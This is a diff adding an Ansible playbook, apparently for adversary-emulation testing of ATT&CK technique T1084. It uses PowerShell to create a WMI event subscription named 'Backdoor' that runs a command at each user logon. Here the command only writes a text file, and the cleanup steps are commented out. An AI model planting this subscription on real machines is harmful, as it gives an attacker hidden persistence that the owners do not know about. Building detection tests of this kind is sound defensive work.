@@ -1,1 +1,32 @@
-T1084 - Windows Management Instrumentation Event Subscription
+# attack_technique: T1084
+- name: T1084 - Windows Management Instrumentation Event Subscription
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+        - name:
+          tags: always
+          win_shell:
+            # Create Filter - User logging in
+            $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+            EventNamespace = 'root/cimv2'
+            Name = "Backdoor-Logon-Filter"
+            Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"
+            QueryLanguage = 'WQL'}
+            # Configure Consumer with Command line
+            $command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value texttext"
+            $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+            Name = "Backdoor-Consumer"
+            CommandLineTemplate = $Command }
+            # Configure Binding
+            Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
+            Filter = $Filter
+            Consumer = $Consumer}
+            
+            
+            #$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'Backdoor-Consumer'"
+            #$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'Backdoor-Logon-Filter'"
+            #$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
+            #$FilterConsumerBindingToCleanup | Remove-WmiObject
+            #$EventConsumerToCleanup | Remove-WmiObject
+            #$EventFilterToCleanup | Remove-WmiObject
